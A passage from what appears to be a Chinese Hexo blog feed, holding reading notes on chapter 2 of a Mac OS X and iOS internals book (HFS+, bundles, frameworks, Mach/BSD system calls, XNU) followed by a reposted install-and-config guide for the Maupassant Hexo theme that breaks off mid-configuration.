<h3 id="Darwin-–-UNIX-核心"><a href="#Darwin-–-UNIX-核心" class="headerlink" title="Darwin – UNIX 核心"></a>Darwin – UNIX 核心</h3><p>OSX 开启 ssh<br>通过修改 /System/Library/LaunchDaemons 中的 plist （ssh.plist），将 Disabled 设置为 false.<br>ios 需要越狱后 单独安装 ssh, 并且默认有2个用户，root 和 mobile 。 root 默认密码 alpine。</p>
<h4 id="HFS-文件系统"><a href="#HFS-文件系统" class="headerlink" title="HFS+ 文件系统"></a>HFS+ 文件系统</h4><p> 此文件系统 可以细分为4个类型：</p>
<ul>
<li>大小写敏感：此时 采用 HFSX 文件系统，是 iOS 上默认的文件系统。</li>
<li>不敏感：OSX 采用此类 文件系统</li>
<li>支持日志功能：此时 采用 JHFS 文件系统，日志文件系统 通过一个日志记录文件 系统任务执行状态，相当于一个快照，文件系统挂载时 可以去查找 日志。</li>
<li>不支持日志功能：</li>
</ul>
<p>从类型名称 就可以知道其区别，注意 大小写敏感文件系统显示 和 访问时的现象。</p>
<p>显示：不管大小写是否 敏感，都采用创建时的方式显示。<br>访问：大小写不敏感就可以 随意使用 大小写 。比如 LS/ETC 。。命令， 铭感的文件系统 就要区分大小写。</p>
<p>开发时是使用的 API 并不是 HFS+文件系统直接提供，而是由 虚拟文件交换系统 VFS 提供。VFS 是内核中使用的所有文件系统的统一接口。<br>VFS 的特性：同时支持 UNIX 文件系统和 外部文件系统。</p>
<h3 id="UNIX-系统目录"><a href="#UNIX-系统目录" class="headerlink" title="UNIX 系统目录"></a>UNIX 系统目录</h3><h4 id="OSX-中-UNIX-的目录"><a href="#OSX-中-UNIX-的目录" class="headerlink" title="OSX 中 UNIX 的目录"></a>OSX 中 UNIX 的目录</h4><hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/bin/</div><div class="line">/sbin/       系统程序</div><div class="line">/usr/        安装第三方软件</div><div class="line">/etc/</div><div class="line">/dev         BSD 设备文件</div><div class="line">/tmp         临时文件</div><div class="line">/var         杂项文件</div></pre></td></tr></table></figure>
<h4 id="OSX-中-特殊的目录"><a href="#OSX-中-特殊的目录" class="headerlink" title="OSX 中 特殊的目录"></a>OSX 中 特殊的目录</h4><hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Applications/</div><div class="line">Developer/</div><div class="line">Volumes/</div><div class="line">Library/</div><div class="line">System/         系统文件。包含了系统中所有重要的组件，如框架--/System/Library/Frameworks，内核模块--/System/Library/Extensions</div><div class="line">Users/</div><div class="line">/Core           核心转储文件。如果 ulimit() 命令允许创建 核心转储文件，那么当进程奔溃时会创建。包含了进程的核心虚拟内存镜像。</div></pre></td></tr></table></figure>
<h4 id="iOS-中-目录-amp-与-OSX-的目录区别"><a href="#iOS-中-目录-amp-与-OSX-的目录区别" class="headerlink" title="iOS 中 目录 &amp; 与 OSX 的目录区别"></a>iOS 中 目录 &amp; 与 OSX 的目录区别</h4><hr>
<p>iOS 内核镜像和 OSX 的区别：</p>
<p>除了上面介绍的文件系统的区别，内核镜像上也存在差异。</p>
<p>iOS 的内核以 kernelcache 的形式将内核扩展 打包在内核中。（kernelcache 在/System/Library/Caches/com.apple.kernelcaches中）。<br>iOS 内核缓存是加密的 Img3文件。</p>
<p>相关章节：<br>5、18 章</p>
<h3 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a>bundle</h3><p>bundle 在 OSX 中有多种解释，不再只是 一种文件格式类型，bundle 同时表示一种 <strong>目录结构</strong>（也称为”包 （package）”）。</p>
<p>bundle 在 OSX 中应用在: 框架、插件、widget、内核扩展中，这些组件都被打包成 bundle。</p>
<p>bundle 中包含了 代码、配置文件（plist）、资源文件。</p>
<h3 id="应用程序和-app"><a href="#应用程序和-app" class="headerlink" title="应用程序和 app"></a>应用程序和 app</h3><p>GUID 目录名？？<br>在 iOS app 运行时会被 chroot 到自己的应用目录下 – 名字为GUID的目录–并且不能逃脱这个目录访问文件系统的其他目录。<br>应用程序会将  自己GUID名字的目录当做根目录，因此需要创建临时目录时，/tmp 指向 GUID/tmp.</p>
<table>
<thead>
<tr>
<th>ios app 标准目录下的文件/目录</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>Documents</td>
<td>应用数据</td>
</tr>
<tr>
<td>iTunesArtwork</td>
<td>app 的图标，一般是 JPG 文件</td>
</tr>
<tr>
<td>iTunesMetaData.plist</td>
<td>app的属性列表文件，二进制的 plist 文件</td>
</tr>
<tr>
<td>Library/</td>
<td>杂项文件，包括 Caches、Cookies、Preferences、WebKit</td>
</tr>
<tr>
<td>tmp</td>
<td>临时文件目录</td>
</tr>
</tbody>
</table>
<h4 id="OSX-上的应用格式"><a href="#OSX-上的应用格式" class="headerlink" title="OSX 上的应用格式"></a>OSX 上的应用格式</h4><p>非常标准的 bundle 格式存储文件</p>
<h4 id="iOS-应用格式"><a href="#iOS-应用格式" class="headerlink" title="iOS 应用格式"></a>iOS 应用格式</h4><p>混乱的 app 格式。<br><code>ll ~/Music/iTunes/iTunes\ Media/Mobile\ Applications</code></p>
<p>从 APP Store 下载应用时，应用以.ipa 文件的形式打包–实际就是 zip 文件。</p>
<h4 id="info-plist-文件"><a href="#info-plist-文件" class="headerlink" title="info.plist 文件"></a>info.plist 文件</h4><p>首先 介绍这个最重要的文件， 此文件相当于 android apk 里的 Manifest.xml。<br>此文件 记录了 bundle 的配置信息、依赖关系和其他属性。</p>
<p>plist 文件的格式，系统支持3种格式的 plist。分别是：XML/JSON/二进制格式–BPlists。<br>除了 JSON使用的较少，其他2种较常见。</p>
<p>工具：plutil 可以将 plist 转换成 不同的格式。<br><code>plutil -convert xml1  --o - &lt;Info.plist&gt; output.Info.plist</code></p>
<p>plist 的内容(p28)：</p>
<table>
<thead>
<tr>
<th>Key</th>
<th>描述/Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>CFBundleDisplayName</td>
<td>显示给用户的 Bundle 名称</td>
</tr>
<tr>
<td>。。</td>
<td>。。</td>
</tr>
</tbody>
</table>
<p>列表中所有的 key 都是 CF 开发，表示这些 key 由 Core Foundation框架定义并处理。</p>
<p>类似的：Cocoa app 包含 NS 开头的 key, NSxxx定义的功能包括：是否允许脚本操作、Java需要、系统偏好设置等等。大部分 NSxxx 只能用于 OSX 不能在 iOS上使用。</p>
<h4 id="其他格式的文件"><a href="#其他格式的文件" class="headerlink" title="其他格式的文件"></a>其他格式的文件</h4><p>这些文件在 Resources 目录下。</p>
<ol>
<li>NIB 文件， 后缀是.nib。该文件是二进制的 plist 文件，其中保存了应用程序的 GUI 组件的位置和设置信息。</li>
<li>lproj 文件， 后缀是.lproj。 支持国际化的文件，每种语言对应一个.lproj 的文件。</li>
<li>icns 图标文件</li>
<li>CodeResources文件，签过文件。 这是一个符号链接，指向_CodeSignature/CodeResources。此文件包含 bundle 中所有其他文件的列表。 key是文件名，valuse 是文件的 bash64.</li>
</ol>
<h4 id="加载默认应用程序"><a href="#加载默认应用程序" class="headerlink" title="加载默认应用程序"></a>加载默认应用程序</h4><p>当点击一个 文件时，系统会自动使用某个 APP 打开程序。实现文件类型 和默认应用程序的绑定是由 LaunchServices 框架实现（次框架和 launchd 没有关系），此框架是 CoreServices 框架的一部分。</p>
<p><code>/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/</code></p>
<p>使用 LaunchServices 提供的工具 lsregister 可以查看文件类型的注册信息。<br><code>cd /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/</code><br><code>./lsregister -dump</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">➜  Support  ./lsregister -dump | more</div><div class="line">    Checking data integrity......done.</div><div class="line">    Status: Database is seeded.</div><div class="line">    Status: Preferences are loaded.</div><div class="line">    Seeded System Version: 10.12.3 (16D32)</div><div class="line">    CacheGUID: 9E923EE5-DAEF-44B8-8B13-3EAAFDB11DEF</div><div class="line">    CacheSequenceNum: 8712</div><div class="line">    Path: /var/folders/fj/5bqzvxbd15s86mvc3kc44ypw0000gn/0/com.apple.LaunchServices-175-v2.csstore</div><div class="line">    DB Object: <span class="tag">&lt;<span class="name">LSDatabase</span> <span class="attr">0x7fd904800000</span>&gt;</span> &#123; path = '/var/folders/fj/5bqzvxbd15s86mvc3kc44ypw0000gn/0/com.apple.LaunchServices-175-v2.csstore' &#125;</div><div class="line">    Store Object: <span class="tag">&lt;<span class="name">CSStore</span> <span class="attr">0x7fd902f00da0</span>&gt;</span> &#123; p = 0x10d800000, length = 6508544/6506368/6484712 &#125;</div><div class="line">    +++++++++++++++++++++ MEMORY USAGE +++++++++++++++++++++</div><div class="line">    sizeof(Data):                  100 ( 100 bytes) --------</div><div class="line">    sizeof(Table):                  80 (  80 bytes) --------</div><div class="line">    sizeof(Unit):                    8 (   8 bytes) --------</div><div class="line">    sizeof(IdentifierCache):         4 (   4 bytes) --------</div><div class="line">    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++</div><div class="line">    Data:                      2222152 (    2.2 MB)   8397 u</div><div class="line">    Container:                     288 ( 288 bytes)      8 u</div><div class="line">    HandlerPref:                  5000 (      5 KB)     50 u</div><div class="line">    BindableKeyMap:             130576 (    131 KB)      1 u</div><div class="line">    PluginProtocolBinding:        4096 (      4 KB)      1 u</div><div class="line">    Type:                       147288 (    147 KB)   1938 u</div><div class="line">    UTIBinding:                  32656 (     33 KB)      1 u</div><div class="line">    Bundle:                     449152 (    449 KB)   1276 u</div><div class="line">    Alias:                     1352372 (    1.4 MB)   1383 u</div><div class="line">    PluginUUIDBinding:            4096 (      4 KB)      1 u</div><div class="line">    Service:                      5616 (      6 KB)    108 u</div><div class="line">    ActivityTypeBinding:         32656 (     33 KB)      1 u</div><div class="line">    String:                     261136 (    261 KB)      1 u</div><div class="line"></div><div class="line">...</div><div class="line">    Container mount state: mounted</div><div class="line">bundle  id:            5164</div><div class="line">        Mach-O UUIDs:  75CF346E-BF45-3B11-A064-5A90985162E9</div><div class="line">        sequenceNum:   5164</div><div class="line">        FamilyID:      0</div><div class="line">        PurchaserID:   0</div><div class="line">        DownloaderID:  0</div><div class="line">        installType:   0</div><div class="line">        appContainer:  #</div><div class="line">        dataContainer: #</div><div class="line">        path:          /private/var/folders/fj/5bqzvxbd15s86mvc3kc44ypw0000gn/C/com.apple.DeveloperTools/All/Xcode/EmbeddedAppDeltas/HelloWorld-OC.app.xDWFUc/HelloWorld-OC.app_sparse.ipa/Payload/HelloWorld-OC.app</div><div class="line">        name:          HelloWorld-OC</div><div class="line">        displayName:   (null)</div><div class="line">        itemName:      (null)</div><div class="line">        teamID:        VYDSDANL33</div><div class="line">        staticSize:    0</div><div class="line">        storeFront:    0</div><div class="line">        versionID:     0</div><div class="line">        sourceAppID:   (null)</div><div class="line">        ratingLabel:   (null)</div><div class="line">        ratingRank:    0</div><div class="line">        category:      (null)</div><div class="line">        2ry category:  (null)</div><div class="line">        ....</div></pre></td></tr></table></figure>
<h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>框架也是一种 bundle 格式。框架是不可移植的，是苹果系统特有的。大部分框架是闭源的，框架提供了完整的运行时接口，隐藏底层的系统和库。</p>
<p>框架的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">CodeResources/</div><div class="line">Headers -&gt; Versions/Current/Headers</div><div class="line">IOKit -&gt; Versions/Current/IOKit</div><div class="line">Resources -&gt; Versions/Current/Resources</div><div class="line">Versions/</div><div class="line">XPCServices -&gt; Versions/Current/XPCServices</div><div class="line">module.map</div><div class="line">Current/                框架首选的版本的符号链接</div><div class="line">framework-name          框架首选的二进制文件的符号链接</div></pre></td></tr></table></figure></p>
<p>OSX 和 iOS 的 GCC 支持 -framework 选项，此选项可以包含任何依赖的框架（第三方框架+系统框架）。<br>此选项 可以指向头文件 或者 库文件。</p>
<p>框架搜索路的环境变量：</p>
<p>框架保存的位置：</p>
<ul>
<li>/System/Library/Frameworks/  系统框架</li>
<li>/Library/Frameworks   第三方框架</li>
<li>~/Library/Frameworks  用户提供的框架</li>
</ul>
<h4 id="重要的框架"><a href="#重要的框架" class="headerlink" title="重要的框架"></a>重要的框架</h4><ol>
<li>Cocoa: 首选的应用程序编程环境<br>支持的语言：Object-C, java, AppleSCript。</li>
</ol>
<p>位置： <code>/System/Library/Frameworks/Cocoa.framework/</code></p>
<p>此框架依赖于：Foundation、AppKit、CoreData<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Versions/Current/Headers/Cocoa.h</div><div class="line"></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;AppKit/AppKit.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;CoreData/CoreData.h&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>保护伞框架（umbrella）：封装了其他框架的框架。<br>封装有2种：</p>
<ol>
<li>只是 #import 。 如 Cocoa</li>
<li>嵌套了其他框架。 如 Application Service</li>
</ol>
<p>2.Carbon: OS9 遗留编程接口的名称</p>
<p>MAC OSX 和 iOS的公共框架列表</p>
<blockquote>
<p>表2-2 (p35)</p>
</blockquote>
<h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><p>Mac 包含多套 API 可用。<br>包括:</p>
<ol>
<li>BSD api 方便移植 unix的代码库 (库 Api)</li>
<li>Mach Trap（Mach　陷阱) OSX 特有的 Api</li>
<li>框架 Api</li>
</ol>
<p>1-2　可以使用C/C++ 开发<br>3 框架Api 有些必须使用OC开发，比如cocoa, 有些框架可以使用C/C++开发,比如 Carbon</p>
<p>一般框架代码会同时支持ｃocoa和Carbon, 比如,访问语音合成器的SpeechSynthesis.Framework框架同时位于 ApplicationServices框架（Carbon,C/C++实现）和AppKit（对于Coacoa, OC实现）</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>OSX 的特殊之处在 OSX 的系统调用提供了２套调用接口。</p>
<ul>
<li>POSIX 调用</li>
<li>mach 调用</li>
</ul>
<ol>
<li>POSIX 调用</li>
</ol>
<p>这是一套　编程标准，专门负责定义API声明（具体到参数类型，格式，返回值，函数名等等）。<br>当前的POSIX主要分为四个部分：<a href="https://zh.wikipedia.org/wiki/POSIX" target="_blank" rel="external">Base Definitions、System Interfaces、Shell and Utilities和Rationale</a></p>
<p>OSX提供的系统调用，在 <strong>系统调用原型</strong>继承了POSIX标准，但是 <strong>系统编号</strong>OSX和标准的编号不同。<br>在 unistd.h　定义了系统调用原型。</p>
<p>如果系统调用原型和系统编号都一样，那么就可以在多台机型上移植二进制程序（机型必须要支持对应的二进制格式，OSX不支持ELF格式）<br>BSD 层对 mach做了一次封装。</p>
<blockquote>
<p>当前的BSD操作系统变种支持各种通用标准，包括IEEE、ANSI、ISO以及POSIX，同时保持传统BSD的良好风范。</p>
</blockquote>
<ol>
<li>mach接口<br>32位，mach系统调用号　是负数, POSIX 的系统调用号时　非负数，所以２者共存。<br>64位，mach系统调用号　从0x2000000 开头，POSIX以　0x1000000　开头。</li>
</ol>
<p>总结BSD和mach的系统调用：<br>32位libSystem.B.dylib库,32位系统调用的指令是 sysenter, 负责系统调用的函数是 __sysenter_trap。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">// mach系统调用</div><div class="line">movl  $0xffffffe5 , %eax        ；系统调用号（负数，　有符号)</div><div class="line">call __sysenter_trap                ；</div><div class="line"></div><div class="line">__sysenter_trap:</div><div class="line">pop %edx</div><div class="line">movl  %esp, %ecx</div><div class="line">sysenter　                   ；执行　系统调用　指令</div><div class="line">nopl (%eax)</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// BSD 系统调用</div><div class="line">movl  $0x000c0010, %eax   ; 系统调用号（非负）</div><div class="line">call  0x00000dd8        ;跳转到 __sysenter_trap </div><div class="line">jae  0x0005d36a         ;</div><div class="line">...</div></pre></td></tr></table></figure>
<p>64 位系统调用的指令是 syscall<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//  mach系统调用</div><div class="line">movq  %rcx, %r10</div><div class="line">movl  %0x0100001a, %eax         ;系统调用号</div><div class="line">syscall             ;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//  BSD系统调用</div><div class="line">movl  $0x02000010, %eax</div><div class="line">movq  %rcx, %r10</div><div class="line">syscall         ;</div></pre></td></tr></table></figure>
<p>发现不管是32位还是64位除了系统调用号不同，其他的地方没有区别（寄存器使用　和　系统调用命令）</p>
<p>系统调用指令　systenter　具体干什么事？</p>
<h3 id="XNU"><a href="#XNU" class="headerlink" title="XNU"></a>XNU</h3><p>xnu　是一个混合内核，xnu由以下几部分构成：</p>
<ul>
<li>Mach微内核</li>
<li>BSD 层</li>
<li>libKern</li>
<li>I/O Kit</li>
</ul>
<p>同时　内核允许动态加载　扩展插件（Kernel Extension , KExt)</p>
<h4 id="Mach"><a href="#Mach" class="headerlink" title="Mach　"></a>Mach　</h4><p>提供了　系统的基本职责，　但是　Mach本身的Api很少。</p>
<ul>
<li>进程和线程的抽象</li>
<li>虚拟内存</li>
<li>任务调度</li>
<li>IPC 和　消息传递的机制</li>
</ul>
<h4 id="BSD"><a href="#BSD" class="headerlink" title="BSD"></a>BSD</h4><p>这一层是对Mach　的封装，并且兼容POSIX 标准。包括的内容：</p>
<ul>
<li>UNIX　进程模型</li>
<li>POSIX 线程模型 (Pthread)，　同步原语</li>
<li>UNIX 用户和用户组</li>
<li>网络协议栈</li>
<li>文件系统访问</li>
<li>设备访问　（/dev　下的驱动设备)</li>
</ul>
<h4 id="libkern"><a href="#libkern" class="headerlink" title="libkern"></a>libkern</h4><p>I/O Kit驱动程序　使用C++语言编写。　libkern　库负责提供C++运行时需要的基类。<br>libkern　是自包含的C++库，提供了C++特性，继承，重载，</p>
<h4 id="I-O-kit"><a href="#I-O-kit" class="headerlink" title="I/O kit"></a>I/O kit</h4><p>I/O Kit　本身就是一套自包含的系统。</p>
<h3 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h3><p>第二章结束了，对OSX 和iOS 的 <strong>架构</strong>和 <strong>关键组件</strong>有了基本认识。同时 对本书的结构有了大体的掌握。<br>通过分析上面２点已知的内容，可以快速定位　需要的知识，帮助完成突发的工作需求。</p>
<table>
<thead>
<tr>
<th></th>
<th>第一部分（1-7章）</th>
<th>第二部分（8-19章）</th>
</tr>
</thead>
<tbody>
<tr>
<td>描述 1</td>
<td>分散的知识点</td>
<td>系统的知识</td>
</tr>
<tr>
<td>描述 2</td>
<td>Apple系统的特色，比如:安全防护技术(3)，Mach-O　可执行格式(4)，引导过程(6)。</td>
<td>内核特性。</td>
</tr>
<tr>
<td>描述 3</td>
<td>还有操作系统中　重要且必备的模块，比如: 进程，调试，启动进程init/Launchd。</td>
<td>主要介绍构成　XNU 的４个部分。<strong>目前的重点　放在第二部分，重点放在　理解XNU　各部分的代码实现</strong></td>
</tr>
</tbody>
</table>
<p>学习的顺序，时间安排，记录的标准。这三个指标需要　动态调整。<br>注意：　记录重要的代码　位置，功能，函数<br><img src="/include/img/bk-xnu/kernel.png" alt="xmind"></p>
<p>Todo:</p>
<pre><code>1. 从xnu开源代码中梳理出这４个部分
</code></pre><h3 id="Change-Log"><a href="#Change-Log" class="headerlink" title="Change Log"></a>Change Log</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-3-13</td>
<td>2.7 节</td>
</tr>
<tr>
<td>2017-03-14</td>
<td>第二章　结束</td>
</tr>
<tr>
<td>2017-03-14</td>
<td>制定 xnu 学习计划</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;《深入解析MAC OS X &amp;amp; iOS 操作系统》- 第 二 章: 合众为一：OSX &amp;amp; iOS 使用的技术&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="了解" scheme="http://yoursite.com/tags/%E4%BA%86%E8%A7%A3/"/>
    
      <category term="xnu" scheme="http://yoursite.com/tags/xnu/"/>
    
  </entry>
  
  <entry>
    <title>简洁主题--Maupassant</title>
    <link href="http://yoursite.com/2017/03/09/%E7%AE%80%E6%B4%81%E4%B8%BB%E9%A2%98-Maupassant/"/>
    <id>http://yoursite.com/2017/03/09/简洁主题-Maupassant/</id>
    <published>2017-03-09T15:26:42.000Z</published>
    <updated>2017-03-09T16:47:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载自：<a href="https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要" target="_blank" rel="external">https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要</a></p>
<hr>
<a id="more"></a>
<p>Maupassant最初是由Cho大神为Typecho平台设计开发的一套响应式模板，体积只有20KB，在各种尺寸的设备上表现出色。由于其简洁大气的风格受到许多用户喜爱，目前也已经被移植到了多个平台上，例如：</p>
<ul>
<li>Typecho：<a href="https://github.com/pagecho/maupassant/" target="_blank" rel="external">https://github.com/pagecho/maupassant/</a></li>
<li>Octopress：<a href="https://github.com/pagecho/mewpassant/" target="_blank" rel="external">https://github.com/pagecho/mewpassant/</a></li>
<li>Farbox：<a href="https://github.com/pagecho/Maupassant-farbox/" target="_blank" rel="external">https://github.com/pagecho/Maupassant-farbox/</a></li>
<li>Wordpress：<a href="https://github.com/iMuFeng/maupassant/" target="_blank" rel="external">https://github.com/iMuFeng/maupassant/</a></li>
<li>Ghost: <a href="https://github.com/LjxPrime/maupassant/" target="_blank" rel="external">https://github.com/LjxPrime/maupassant/</a><br>我在一年多以前使用Typecho博客程序的时候就用过这套主题（历史文章），后来更换至Hexo后不得不暂时放弃它，直到几个月前发现了由icylogic移植到Hexo的版本，喜出望外，立刻回归到Maupassant。</li>
</ul>
<p>不过由icylogic最初移植的版本只保留了主题最基本的模块，跟Cho自己发布的Farbox版类似，无法满足大部分爱折腾的Hexoer的需要。因此，在这半年的使用过程中，我将icylogic的源码fork过来，陆陆续续添加了一些想要的功能，目前能够实现的功能已经跟当初Typecho平台上的版本差不多了。</p>
<p>我已经将修改后的代码发布在Github上，有兴趣的朋友可以下载试用，并欢迎反馈问题：</p>
<h3 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h3><p>安装主题和渲染器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant</div><div class="line">$ npm install hexo-renderer-jade --save</div><div class="line">$ npm install hexo-renderer-sass --save</div></pre></td></tr></table></figure></p>
<p>编辑Hexo目录下的 _config.yml，将theme的值改为maupassant。</p>
<p>注：若npm install hexo-renderer-sass安装时报错，可能是国内网络问题，请尝试使用代理或者切换至<a href="http://npm.taobao.org/" target="_blank" rel="external">淘宝NPM镜像</a>安装，感谢光头强提供的方法。</p>
<h3 id="功能配置"><a href="#功能配置" class="headerlink" title="功能配置"></a>功能配置</h3><figure class="highlight c"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">fancybox: <span class="literal">true</span> ## If you want to use fancybox please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">duoshuo: ## Your duoshuo_shortname, e.g. username</div><div class="line">disqus: ## Your disqus_shortname, e.g. username</div><div class="line">google_search: <span class="literal">true</span> ## Use Google search, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">baidu_search: ## Use Baidu search, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">swiftype: ## Your swiftype_key, e.g. m7b11ZrsT8Me7gzApciT</div><div class="line">tinysou: ## Your tinysou_key, e.g. <span class="number">4</span>ac092ad8d749fdc6293</div><div class="line">self_search: ## Use a jQuery-based local search engine, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">google_analytics: ## Your Google Analytics tracking id, e.g. UA<span class="number">-42425684</span><span class="number">-2</span></div><div class="line">baidu_analytics: ## Your Baidu Analytics tracking id, e.g. <span class="number">8006843039519956000</span></div><div class="line">show_category_count: <span class="literal">false</span> ## If you want to show the count of categories in the sidebar widget please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">shareto: <span class="literal">true</span> ## If you want to use the share button please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">busuanzi: <span class="literal">true</span> ## If you want to use Busuanzi page views please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">widgets_on_small_screens: <span class="literal">false</span> ## Set to <span class="literal">true</span> to enable widgets on small screens.</div><div class="line">menu:</div><div class="line">  - page: home</div><div class="line">    directory: .</div><div class="line">    icon: fa-home</div><div class="line">  - page: archive</div><div class="line">    directory: archives/</div><div class="line">    icon: fa-archive</div><div class="line">  - page: about</div><div class="line">    directory: about/</div><div class="line">    icon: fa-user</div><div class="line">  - page: rss</div><div class="line">    directory: atom.xml</div><div class="line">    icon: fa-rss</div><div class="line">widgets: ## Six widgets in sidebar provided: search, category, tag, recent_posts, rencent_comments and links.</div><div class="line">  - search</div><div class="line">  - category</div><div class="line">  - tag</div><div class="line">  - recent_posts</div><div class="line">  - recent_comments</div><div class="line">  - links</div><div class="line">links:</div><div class="line">  - title: site-name1</div><div class="line">    url: http:<span class="comment">//www.example1.com/</span></div><div class="line">  - title: site-name2</div><div class="line">    url: http:<span class="comment">//www.example2.com/</span></div><div class="line">  - title: site-name3</div><div class="line">    url: http:<span class="comment">//www.example3.com/</span></div><div class="line"></div><div class="line">timeline:</div><div class="line">  - num: <span class="number">1</span></div><div class="line">    word: <span class="number">2014</span>/<span class="number">06</span>/<span class="number">12</span>-Start</div><div class="line">  - num: <span class="number">2</span></div><div class="line">    word: <span class="number">2014</span>/<span class="number">11</span>/<span class="number">29</span>-XXX</div><div class="line">  - num: <span class="number">3</span></div><div class="line">    word: <span class="number">2015</span>/<span class="number">02</span>/<span class="number">18</span>-DDD</div><div class="line">  - num: <span class="number">4</span></div><div class="line">    word: More</div><div class="line"></div><div class="line"># Static files</div><div class="line">js: js</div><div class="line">css: css</div><div class="line"># Theme 